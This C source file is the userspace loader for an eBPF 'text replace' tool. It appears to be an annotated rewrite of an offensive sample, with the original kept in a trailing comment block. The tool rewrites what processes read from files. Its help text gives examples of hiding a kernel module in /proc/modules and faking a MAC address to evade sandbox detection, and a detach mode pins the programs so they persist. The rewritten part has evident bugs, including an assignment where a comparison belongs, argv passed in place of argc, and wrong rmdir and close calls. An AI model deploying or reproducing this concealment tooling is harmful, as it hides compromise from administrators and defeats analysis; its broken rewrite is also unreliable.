#include <argp.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include "replace2.skel.h"
#include "replace2.h"

#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include <signal.h>
#include <sys/resource.h>
#include <errno.h>
#include <fcntl.h>
#include <stdlib.h>


static volatile sig_atomic_t exiting; //操作是原子的
void sig_handler(int signo) {
    exiting = 1;
}

static bool handle_signals() {
    __sighandler_t sighandler = signal(SIGINT, sig_handler);
    if (sighandler == SIG_ERR) {
        printf("Failed to set signal handler: %s\n", strerror(errno));
        return false;
    }

    sighandler = signal(SIGTERM, sig_handler);
    if (sighandler == SIG_ERR) {
        printf("Failed to set signal handler: %s\n", strerror(errno));
        return false;
    }
    return true;
}

static int libbpf_print_fn(enum libbpf_print_level level, const char *format, va_list args) {
    vfprintf(stderr, format, args);
}

//总的来说，这个函数的作用是尝试将进程的内存锁定限制提升到无限制，如果操作失败则给出相应的错误提示。
static bool bump_memlock_rlimit() {
    struct rlimit rlim_new = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY,
    };

    if(setrlimit(RLIMIT_MEMLOCK, &rlim_new)) {
        fprintf(stderr, "Failed to increase RLIMIT_MEMLOCK limit: %s\n", strerror(errno));
        return false;
    }
    return true;
}

static bool set_up() {
    libbpf_set_print(libbpf_print_fn);

    if(!handle_signals()) {
        return false;
    }

    if(!bump_memlock_rlimit()) {
        return false;
    }
    return true;
}

static struct env {
    char filename[FILENAME_LEN_MAX];
    char input[FILENAME_LEN_MAX];
    char replace[FILENAME_LEN_MAX];
    bool detatch;
    int target_ppid;
} env;

const char *argp_program_version = "textreplace2 1.0";
const char *argp_program_bug_address = "<path@tofile.dev>";
const char argp_program_doc[] =
"Text Replace\n"
"\n"
"Replaces text in a file.\n"
"To pass in newlines use \%'\\n' e.g.:\n"
"    ./textreplace2 -f /proc/modules -i ppdev -r $'aaaa\\n'"
"\n"
"USAGE: ./textreplace2 -f filename -i input -r output [-t 1111] [-d]\n"
"EXAMPLES:\n"
"Hide kernel module:\n"
"  ./textreplace2 -f /proc/modules -i 'joydev' -r 'cryptd'\n"
"Fake Ethernet adapter (used in sandbox detection):  \n"
"  ./textreplace2 -f /sys/class/net/eth0/address -i '00:15:5d:01:ca:05' -r '00:00:00:00:00:00'  \n"
"Run detached (userspace program can exit):\n"
"  ./textreplace2 -f /proc/modules -i 'joydev' -r 'cryptd' --detach\n"
"To stop detached program:\n"
"  sudo rm -rf /sys/fs/bpf/textreplace\n"
"";

static const struct argp_option opts[] = {
    { "filename", 'f', "FILENAME", 0, "Path to file to replace text in" },
    { "input", 'i', "INPUT", 0, "Text to be replaced in file, max 20 chars" },
    { "replace", 'r', "REPLACE", 0, "Text to replace with in file, must be same size as -t" },
    { "target-ppid", 't', "PPID", 0, "Optional Parent PID, will only affect its children." },
    { "detatch", 'd', NULL, 0, "Pin programs to filesystem and exit usermode process" },
    {},
};

static error_t parse_arg(int key, char *arg, struct argp_state *state)
{
    switch (key) {
    case 'i':
        if (strlen(arg) >= TEXT_LEN_MAX) {
            fprintf(stderr, "Text must be less than %d characters\n", FILENAME_LEN_MAX);
            argp_usage(state);
        }
        strncpy(env.input, arg, sizeof(env.input));
        break;
    case 'd':
        env.detatch = true;
        break;
    case 'r':
        if (strlen(arg) >= TEXT_LEN_MAX) {
            fprintf(stderr, "Text must be less than %d characters\n", FILENAME_LEN_MAX);
            argp_usage(state);
        }
        strncpy(env.replace, arg, sizeof(env.replace));
        break;
    case 'f':
        if (strlen(arg) >= FILENAME_LEN_MAX) {
            fprintf(stderr, "Filename must be less than %d characters\n", FILENAME_LEN_MAX);
            argp_usage(state);
        }
        strncpy(env.filename, arg, sizeof(env.filename));
        break;
    case 't':
        errno = 0;
        env.target_ppid = strtol(arg, NULL, 10);
        if (errno || env.target_ppid <= 0) {
            fprintf(stderr, "Invalid pid: %s\n", arg);
            argp_usage(state);
        }
        break;
    case ARGP_KEY_ARG:
        argp_usage(state);
        break;
    default:
        return ARGP_ERR_UNKNOWN;
    }
    return 0;
}

static const struct argp argp = {
    .doc = argp_program_doc,
    .options = opts,
    .parser = parse_arg,
};

static int handle_event(void *ctx, void *data, size_t data_sz)
{
    const struct event *e = data;
    if (e->success)
        printf("Replaced text in PID %d (%s)\n", e->pid, e->comm);
    else
        printf("Failed to replace text in PID %d (%s)\n", e->pid, e->comm);
    return 0;
}

static const char *base_folder = "/sys/fs/bpf/textreplace";

/*
struct stat这个结构体是用来描述一个linux系统文件系统中的文件属性的结构。
stat函数获取文件的所有相关信息，
一般情况下，我们关心文件大小和创建时间、访问时间、修改时间。
*/
/*
struct stat {

        mode_t     st_mode;       //文件对应的模式，文件，目录等
        ino_t      st_ino;       //inode节点号
        dev_t      st_dev;        //设备号码
        dev_t      st_rdev;       //特殊设备号码
        nlink_t    st_nlink;      //文件的连接数
        uid_t      st_uid;        //文件所有者
        gid_t      st_gid;        //文件所有者对应的组
        off_t      st_size;       //普通文件，对应的文件字节数
        time_t     st_atime;      //文件最后被访问的时间
        time_t     st_mtime;      //文件内容最后被修改的时间
        time_t     st_ctime;      //文件状态改变时间
        blksize_t st_blksize;    //文件内容对应的块大小
        blkcnt_t   st_blocks;     //伟建内容对应的块数量
      };
*/
/*
struct dirent
  {
#ifndef __USE_FILE_OFFSET64
    __ino_t d_ino;
    __off_t d_off;
#else
    __ino64_t d_ino;
    __off64_t d_off;
#endif
    unsigned short int d_reclen;
    unsigned char d_type;
    char d_name[256];		/* We must not include limits.h! */
  //};
//*/

// bash shell stat 命令的输出结果
int rmtree(const char *path) {
    size_t path_len;
    char *full_path;
    DIR *dir;
    struct stat stat_path, stat_entry;
    struct dirent *entry;

    stat(path, &stat_path);
    
    //是目录返回
    if(S_ISDIR(stat_path.st_mode) == 0) {
        //是不是目录
        return 0;
    }

    if((dir = opendir(path)) == NULL) {
        fprintf(stderr, "opendir %s failed\n", path);
        return 1;
    }

    path_len = strlen(path);
    //读取目录中的entry
    while((entry = readdir(dir)) != NULL) {
        //跳过“.”和“..”
        if(!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) {
            continue;
        }

        full_path = calloc(path_len + strlen(entry->d_name) + 1, sizeof(char));
        strcpy(full_path, path);
        //连接
        /*"path/entry->d_name"*/
        strcat(full_path, "/");
        strcat(full_path, entry->d_name);

        stat(full_path, &stat_entry);

        if(S_ISDIR(stat_entry.st_mode) != 0) {
            rmtree(full_path); //递归
            continue;
        }

        if(unlink(full_path)) {
            printf("can not remove a file %s\n", full_path);
            return 1;
        }
        free(full_path);
    }
    //

    if(rmdir(full_path)) {
        printf("Can not remove a directory %s \n", path);
        return 1;
    }

    close(dir);
    return 0;
}

int cleanup_pins() {
    return rmtree(base_folder);
}

int pin_program(struct bpf_porgram *prog, const char *path) {
    int err;
    err = bpf_obj_pin(prog, path);
    if(err) {
        fprintf(stderr, "Failed to pin program: %s\n", strerror(errno));
        return err;
    }
    return err;
}

int pin_map(struct bpf_map *map, const char *path) {
    int err;
    err = bpf_obj_pin(map, path);
    if(err) {
        fprintf(stderr, "Failed to pin map: %s\n", strerror(errno));
        return err;
    }
    return err;
}

int pin_link(struct bpf_link *link, const char *path) {
    int err;
    err = bpf_link_pin(link, path);
    if(err) {
        fprintf(stderr, "Failed to pin link: %s\n", strerror(errno));
        return err;
    }
    return err;
}

static int pin_stuff(struct replace2 *skel) {
    int err;
    int counter = 0;
    struct bpf_program *prog;
    struct bpf_map *map;

    char pin_path[100];

    // pin maps
    bpf_object__for_each_map(map, skel->maps) {
        sprintf(pin_path, "%s/map_%02d", base_folder, counter++);
        err = pin_map(map, pin_path);
        if(err) {return err;}
    }

    // pin programs
    counter = 0;
    bpf_object__for_each_program(prog, skel->obj) {
        sprintf(pin_path, "%s/prog_%02d", base_folder, counter++);
        err = pin_program(prog, pin_path);
        if(err) {return err;}
    }

    // pin links
    counter = 0;
    memset(pin_path, '\x00', sizeof(pin_path));
    
    sprintf(pin_path, "%s/link_%02d", base_folder, counter++);
    err = pin_link(skel->links.handle_close_exit, pin_path);
    if(err) {return err;}
    
    sprintf(pin_path, "%s/link_%02d", base_folder, counter++);
    err = pin_link(skel->links.handle_openat_enter, pin_path);
    if(err) {return err;}

    sprintf(pin_path, "%s/link_%02d", base_folder, counter++);
    err = pin_link(skel->links.handle_openat_exit, pin_path);
    if(err) {return err;}

    sprintf(pin_path, "%s/link_%02d", base_folder, counter++);
    err = pin_link(skel->links.handle_read_enter, pin_path);
    if(err) {return err;}

    sprintf(pin_path, "%s/link_%02d", base_folder, counter++);
    err = pin_link(skel->links.find_possible_addrs, pin_path);
    if(err) {return err;}

    sprintf(pin_path, "%s/link_%02d", base_folder, counter++);
    err = pin_link(skel->links.check_possible_address, pin_path);
    if(err) {return err;}

    sprintf(pin_path, "%s/link_%02d", base_folder, counter++);
    err = pin_link(skel->links.overwrite_address, pin_path);
    if(err) {return err;}

    return 0;
}

int main(int argc, char ** argv) {
    struct ring_buffer *rb = NULL;
    struct replace2 *skel;
    int err;
    int index;

    err = argp_parse(&argp, argv, argv, 0, NULL, NULL);
    if(err) {
        return err;
    }

    if(env.filename[0] = '\x00' || env.input[0] == '\x00' || env.replace[0] == '\x00') {
        printf("ERROR: filename, input, and replace all requried, see %s --help\n", argv[0]);
        exit(1);
    }

    if(strlen(env.input) != strlen(env.replace)) {
        printf("ERROR: input and replace text must be the same length\n");
        exit(1);        
    }

    if(!set_up()) {
        exit(1);
    }

    if(env.detatch) {
        //check bpf filesystem is mounted 是否挂载了bpf文件系统
        if(access("/sys/fs/bpf", F_OK) != 0) {
            fprintf(stderr, "Make sure bpf filesystem mounted by running:\n");
            fprintf(stderr, "    sudo mount bpffs -t bpf /sys/fs/bpf\n");
            return 1;
        }
        if(cleanup_pins()) {
            return 1;
        }
    }

    skel = replace2__open();
    if (!skel) {
        fprintf(stderr, "Failed to open BPF program: %s\n", strerror(errno));
        return 1;
    }

    err = replace2__load(skel);
    if (err) {
		fprintf(stderr, "Failed to load and verify BPF skeleton\n");
		goto cleanup;
	}

    //更新两个map
    struct tr_file file;
    strncpy(file.filename, env.filename, sizeof(file.filename));

    index = PROG_00;
    file.filename_len = strlen(file.filename);
    //在者更新的map
    err = bpf_map_update_elem(bpf_map__fd(skel->maps.map_filename), &index, &file, BPF_ANY);
    if(err == -1) {
        printf("Failed to add filename to map? %s\n", strerror(errno));
        goto cleanup;
    }

    struct tr_text text;
    strncpy(text.text, env.input, sizeof(text.text));

    index = PROG_00;
    text.text_len = strlen(text.text);
    err = bpf_map_update_elem(bpf_map__fd(skel->maps.map_text), &index, &text, BPF_ANY);
    if(err == -1) {
        printf("Failed to add text input to map? %s\n", strerror(errno));
        goto cleanup;
    }
    
    strncpy(text.text, env.replace, sizeof(text.text));
    index = PROG_01;
    text.text_len = strlen(text.text);
    err = bpf_map_update_elem(bpf_map__fd(skel->maps.map_text), &index, &text, BPF_ANY);
    if(err == -1) {
        printf("Failed to add text replace to map? %s\n", strerror(errno));
        goto cleanup;
    }

    //初始化尾调用
    index = PROG_01;
    int prog_fd = bpf_program__fd(skel->progs.check_possible_address);
    err = bpf_map_update_elem(bpf_map__fd(skel->maps.map_prog_array), &index, &prog_fd, BPF_ANY);
    if(err == -1) {
        printf("Failed to add program to prog array! %s\n", strerror(errno));
        goto cleanup;  
    }

    index = PROG_02;
    prog_fd = bpf_program__fd(skel->progs.overwrite_address);
    err = bpf_map_update_elem(bpf_map__fd(skel->maps.map_prog_array), &index, &prog_fd, BPF_ANY);
    if(err == -1) {
        printf("Failed to add program to prog array! %s\n", strerror(errno));
        goto cleanup;
    }

    err = replace2__attach(skel);
    if(err) {
        fprintf(stderr, "Failed to attach BPF program: %s\n", strerror(errno));
        goto cleanup;
    }

    if(env.detatch) {
        //初始化
        err = pin_stuff(skel);
        if(err) {
            fprintf(stderr, "Failed to pin stuff\n");
            goto cleanup;
        }
        printf("----------------------------------\n");
        printf("----------------------------------\n");
        printf("Successfully started!\n");
        printf("Please run `sudo cat /sys/kernel/debug/tracing/trace_pipe` "
            "to see output of the BPF programs.\n");
        printf("Files are pinned in folder %s\n", base_folder);
        printf("To stop programs, run 'sudo rm -r%s'\n", base_folder);
    } else {
        rb = ring_buffer__new(bpf_map__fd(skel->maps.rb), handle_event, NULL, NULL);
        if(!rb) {
            err = -1;
            fprintf(stderr, "Failed to create ring buffer\n");
            goto cleanup;
        }

        printf("Successfully started!\n");
        while(!exiting) {
            err = ring_buffer__poll(rb, 100);
            if(err == -EINTR) {
                err = 0;
                break;
            }
            if(err < 0) {
                printf("Error polling perf buffer: %d\n", err);
                break;
            }
        }
    }

cleanup:
    replace2__destroy(skel);
    if(err != 0) {
        cleanup_pins();
    }
    return -err;
}

/*
#include <argp.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include "textreplace2.skel.h"
#include "textreplace2.h"

#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include <unistd.h>
#include <signal.h>
#include <sys/resource.h>
#include <errno.h>
#include <fcntl.h>

static volatile sig_atomic_t exiting;

void sig_int(int signo)
{
    exiting = 1;
}

static bool setup_sig_handler() {
    // Add handlers for SIGINT and SIGTERM so we shutdown cleanly
    __sighandler_t sighandler = signal(SIGINT, sig_int);
    if (sighandler == SIG_ERR) {
        fprintf(stderr, "can't set signal handler: %s\n", strerror(errno));
        return false;
    }
    sighandler = signal(SIGTERM, sig_int);
    if (sighandler == SIG_ERR) {
        fprintf(stderr, "can't set signal handler: %s\n", strerror(errno));
        return false;
    }
    return true;
}

static int libbpf_print_fn(enum libbpf_print_level level, const char *format, va_list args)
{
    return vfprintf(stderr, format, args);
}

static bool bump_memlock_rlimit(void)
{
    struct rlimit rlim_new = {
        .rlim_cur    = RLIM_INFINITY,
        .rlim_max    = RLIM_INFINITY,
    };

    if (setrlimit(RLIMIT_MEMLOCK, &rlim_new)) {
        fprintf(stderr, "Failed to increase RLIMIT_MEMLOCK limit! (hint: run as root)\n");
        return false;
    }
    return true;
}


static bool setup() {
    // Set up libbpf errors and debug info callback 
    libbpf_set_print(libbpf_print_fn);

    // Bump RLIMIT_MEMLOCK to allow BPF sub-system to do anything 
    if (!bump_memlock_rlimit()) {
        return false;
    };

    // Setup signal handler so we exit cleanly
    if (!setup_sig_handler()) {
        return false;
    }

    return true;
}

// Setup Argument stuff
static struct env {
    char filename[FILENAME_LEN_MAX];
    char input[FILENAME_LEN_MAX];
    char replace[FILENAME_LEN_MAX];
    bool detatch;
    int target_ppid;
} env;

const char *argp_program_version = "textreplace2 1.0";
const char *argp_program_bug_address = "<path@tofile.dev>";
const char argp_program_doc[] =
"Text Replace\n"
"\n"
"Replaces text in a file.\n"
"To pass in newlines use \%'\\n' e.g.:\n"
"    ./textreplace2 -f /proc/modules -i ppdev -r $'aaaa\\n'"
"\n"
"USAGE: ./textreplace2 -f filename -i input -r output [-t 1111] [-d]\n"
"EXAMPLES:\n"
"Hide kernel module:\n"
"  ./textreplace2 -f /proc/modules -i 'joydev' -r 'cryptd'\n"
"Fake Ethernet adapter (used in sandbox detection):  \n"
"  ./textreplace2 -f /sys/class/net/eth0/address -i '00:15:5d:01:ca:05' -r '00:00:00:00:00:00'  \n"
"Run detached (userspace program can exit):\n"
"  ./textreplace2 -f /proc/modules -i 'joydev' -r 'cryptd' --detach\n"
"To stop detached program:\n"
"  sudo rm -rf /sys/fs/bpf/textreplace\n"
"";

static const struct argp_option opts[] = {
    { "filename", 'f', "FILENAME", 0, "Path to file to replace text in" },
    { "input", 'i', "INPUT", 0, "Text to be replaced in file, max 20 chars" },
    { "replace", 'r', "REPLACE", 0, "Text to replace with in file, must be same size as -t" },
    { "target-ppid", 't', "PPID", 0, "Optional Parent PID, will only affect its children." },
    { "detatch", 'd', NULL, 0, "Pin programs to filesystem and exit usermode process" },
    {},
};

static error_t parse_arg(int key, char *arg, struct argp_state *state)
{
    switch (key) {
    case 'i':
        if (strlen(arg) >= TEXT_LEN_MAX) {
            fprintf(stderr, "Text must be less than %d characters\n", FILENAME_LEN_MAX);
            argp_usage(state);
        }
        strncpy(env.input, arg, sizeof(env.input));
        break;
    case 'd':
        env.detatch = true;
        break;
    case 'r':
        if (strlen(arg) >= TEXT_LEN_MAX) {
            fprintf(stderr, "Text must be less than %d characters\n", FILENAME_LEN_MAX);
            argp_usage(state);
        }
        strncpy(env.replace, arg, sizeof(env.replace));
        break;
    case 'f':
        if (strlen(arg) >= FILENAME_LEN_MAX) {
            fprintf(stderr, "Filename must be less than %d characters\n", FILENAME_LEN_MAX);
            argp_usage(state);
        }
        strncpy(env.filename, arg, sizeof(env.filename));
        break;
    case 't':
        errno = 0;
        env.target_ppid = strtol(arg, NULL, 10);
        if (errno || env.target_ppid <= 0) {
            fprintf(stderr, "Invalid pid: %s\n", arg);
            argp_usage(state);
        }
        break;
    case ARGP_KEY_ARG:
        argp_usage(state);
        break;
    default:
        return ARGP_ERR_UNKNOWN;
    }
    return 0;
}
static const struct argp argp = {
    .options = opts,
    .parser = parse_arg,
    .doc = argp_program_doc,
};

static int handle_event(void *ctx, void *data, size_t data_sz)
{
    const struct event *e = data;
    if (e->success)
        printf("Replaced text in PID %d (%s)\n", e->pid, e->comm);
    else
        printf("Failed to replace text in PID %d (%s)\n", e->pid, e->comm);
    return 0;
}

static const char* base_folder = "/sys/fs/bpf/textreplace";

int rmtree(const char *path)
{
    size_t path_len;
    char *full_path;
    DIR *dir;
    struct stat stat_path, stat_entry;
    struct dirent *entry;

    // stat for the path
    stat(path, &stat_path);

    // if path does not exists or is not dir - exit with status -1
    if (S_ISDIR(stat_path.st_mode) == 0) {
        // ignore
        return 0;
    }

    // if not possible to read the directory for this user
    if ((dir = opendir(path)) == NULL) {
        fprintf(stderr, "%s: %s\n", "Can`t open directory", path);
        return 1;
    }

    // the length of the path
    path_len = strlen(path);

    // iteration through entries in the directory
    while ((entry = readdir(dir)) != NULL) {
        // skip entries "." and ".."
        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, ".."))
            continue;

        // determinate a full path of an entry
        full_path = calloc(path_len + strlen(entry->d_name) + 1, sizeof(char));
        strcpy(full_path, path);
        strcat(full_path, "/");
        strcat(full_path, entry->d_name);

        // stat for the entry
        stat(full_path, &stat_entry);

        // recursively remove a nested directory
        if (S_ISDIR(stat_entry.st_mode) != 0) {
            rmtree(full_path);
            continue;
        }

        // remove a file object
        if (unlink(full_path)) {
            printf("Can`t remove a file: %s\n", full_path);
            return 1;
        }
        free(full_path);
    }

    // remove the devastated directory and close the object of it
    if (rmdir(path)) {
        printf("Can`t remove a directory: %s\n", path);
        return 1;
    }

    closedir(dir);
    return 0;
}


int cleanup_pins() {
    return rmtree(base_folder);
}

int pin_program(struct bpf_program *prog, const char* path)
{
    int err;
    err = bpf_program__pin(prog, path);
        if (err) {
            fprintf(stdout, "could not pin prog %s: %d\n", path, err);
            return err;
        }
    return err;
}

int pin_map(struct bpf_map *map, const char* path)
{
    int err;
    err = bpf_map__pin(map, path);
        if (err) {
            fprintf(stdout, "could not pin map %s: %d\n", path, err);
            return err;
        }
    return err;
}

int pin_link(struct bpf_link *link, const char* path)
{
    int err;
    err = bpf_link__pin(link, path);
        if (err) {
            fprintf(stdout, "could not pin link %s: %d\n", path, err);
            return err;
        }
    return err;
}

static int pin_stuff(struct textreplace2_bpf *skel) {
    /*
    Sorry in advance for not this function being quite garbage,
    but I tried to keep the code simple to make it easy to read
    and modify
    */
    /*int err;
    int counter = 0;
    struct bpf_program *prog;
    struct bpf_map *map;
    char pin_path[100];

    // Pin Maps
    bpf_object__for_each_map(map, skel->obj) {
        sprintf(pin_path, "%s/map_%02d", base_folder, counter++);
        err = pin_map(map, pin_path);
        if (err) { return err; }
    }

    // Pin Programs
    counter = 0;
    bpf_object__for_each_program(prog, skel->obj) {
        sprintf(pin_path, "%s/prog_%02d", base_folder, counter++);
        err = pin_program(prog, pin_path);
        if (err) { return err; }
    }

    // Pin Links. There's not for_each for links
    // so do it manually in a gross way
    counter = 0;
    memset(pin_path, '\x00', sizeof(pin_path));
    sprintf(pin_path, "%s/link_%02d", base_folder, counter++);
    err = pin_link(skel->links.handle_close_exit, pin_path);
    if (err) { return err; }
    sprintf(pin_path, "%s/link_%02d", base_folder, counter++);
    err = pin_link(skel->links.handle_openat_enter, pin_path);
    if (err) { return err; }
    sprintf(pin_path, "%s/link_%02d", base_folder, counter++);
    err = pin_link(skel->links.handle_openat_exit, pin_path);
    if (err) { return err; }
    sprintf(pin_path, "%s/link_%02d", base_folder, counter++);
    err = pin_link(skel->links.handle_read_enter, pin_path);
    if (err) { return err; }
    sprintf(pin_path, "%s/link_%02d", base_folder, counter++);
    err = pin_link(skel->links.find_possible_addrs, pin_path);
    if (err) { return err; }
    sprintf(pin_path, "%s/link_%02d", base_folder, counter++);
    err = pin_link(skel->links.check_possible_addresses, pin_path);
    if (err) { return err; }
    sprintf(pin_path, "%s/link_%02d", base_folder, counter++);
    err = pin_link(skel->links.overwrite_addresses, pin_path);
    if (err) { return err; }

    return 0;
}

int main(int argc, char **argv)
{
    struct ring_buffer *rb = NULL;
    struct textreplace2_bpf *skel;
    int err;
    int index;
    // Parse command line arguments
    err = argp_parse(&argp, argc, argv, 0, NULL, NULL);
    if (err) {
        return err;
    }
    if (env.filename[0] == '\x00' || env.input[0] == '\x00' || env.replace[0] == '\x00') {
        printf("ERROR: filename, input, and replace all requried, see %s --help\n", argv[0]);
        exit(1);
    }
    if (strlen(env.input) != strlen(env.replace)) {
        printf("ERROR: input and replace text must be the same length\n");
        exit(1);
    }

    // Do common setup
    if (!setup()) {
        exit(1);
    }

    if (env.detatch) {
        // Check bpf filesystem is mounted
        if (access("/sys/fs/bpf", F_OK) != 0) {
            fprintf(stderr, "Make sure bpf filesystem mounted by running:\n");
            fprintf(stderr, "    sudo mount bpffs -t bpf /sys/fs/bpf\n");
            return 1;
        }
        if (cleanup_pins())
            return 1;
    }

    // Open BPF application 
    skel = textreplace2_bpf__open();
    if (!skel) {
        fprintf(stderr, "Failed to open BPF program: %s\n", strerror(errno));
        return 1;
    }

    // Verify and load program
    err = textreplace2_bpf__load(skel);
	if (err) {
		fprintf(stderr, "Failed to load and verify BPF skeleton\n");
		goto cleanup;
	}

    struct tr_file file;
    strncpy(file.filename, env.filename, sizeof(file.filename));
    index = PROG_00;
    file.filename_len = strlen(env.filename);
    err = bpf_map_update_elem(
        bpf_map__fd(skel->maps.map_filename),
        &index,
        &file,
        BPF_ANY
    );
    if (err == -1) {
        printf("Failed to add filename to map? %s\n", strerror(errno));
        goto cleanup;
    }

    struct tr_text text;
    strncpy(text.text, env.input, sizeof(text.text));
    index = PROG_00;
    text.text_len = strlen(env.input);
    err = bpf_map_update_elem(
        bpf_map__fd(skel->maps.map_text),
        &index,
        &text,
        BPF_ANY
    );
    if (err == -1) {
        printf("Failed to add text input to map? %s\n", strerror(errno));
        goto cleanup;
    }
    strncpy(text.text, env.replace, sizeof(text.text));
    index = PROG_01;
    text.text_len = strlen(env.replace);
    err = bpf_map_update_elem(
        bpf_map__fd(skel->maps.map_text),
        &index,
        &text,
        BPF_ANY
    );
    if (err == -1) {
        printf("Failed to add text replace to map? %s\n", strerror(errno));
        goto cleanup;
    }

    // Add program to map so we can call it later
    index = PROG_01;
    int prog_fd = bpf_program__fd(skel->progs.check_possible_addresses);
    err = bpf_map_update_elem(
        bpf_map__fd(skel->maps.map_prog_array),
        &index,
        &prog_fd,
        BPF_ANY);
    if (err == -1) {
        printf("Failed to add program to prog array! %s\n", strerror(errno));
        goto cleanup;
    }
    index = PROG_02;
    prog_fd = bpf_program__fd(skel->progs.overwrite_addresses);
    err = bpf_map_update_elem(
        bpf_map__fd(skel->maps.map_prog_array),
        &index,
        &prog_fd,
        BPF_ANY);
    if (err == -1) {
        printf("Failed to add program to prog array! %s\n", strerror(errno));
        goto cleanup;
    }

    // Attach tracepoint handler 
    err = textreplace2_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF program: %s\n", strerror(errno));
        goto cleanup;
    }

    if (env.detatch) {
        err = pin_stuff(skel);
        if (err) {
            fprintf(stderr, "Failed to pin stuff\n");
            goto cleanup;
        }

        printf("----------------------------------\n");
        printf("----------------------------------\n");
        printf("Successfully started!\n");
        printf("Please run `sudo cat /sys/kernel/debug/tracing/trace_pipe` "
            "to see output of the BPF programs.\n");
        printf("Files are pinned in folder %s\n", base_folder);
        printf("To stop programs, run 'sudo rm -r%s'\n", base_folder);
    }
    else {
        // Set up ring buffer
        rb = ring_buffer__new(bpf_map__fd( skel->maps.rb), handle_event, NULL, NULL);
        if (!rb) {
            err = -1;
            fprintf(stderr, "Failed to create ring buffer\n");
            goto cleanup;
        }

        printf("Successfully started!\n");
        while (!exiting) {
            err = ring_buffer__poll(rb, 100 /* timeout, ms *///);
            /* Ctrl-C will cause -EINTR */
            /*if (err == -EINTR) {
                err = 0;
                break;
            }
            if (err < 0) {
                printf("Error polling perf buffer: %d\n", err);
                break;
            }
        }
    }

cleanup:
    textreplace2_bpf__destroy(skel);
    if (err != 0) {
        cleanup_pins();
    }
    return -err;
}

*/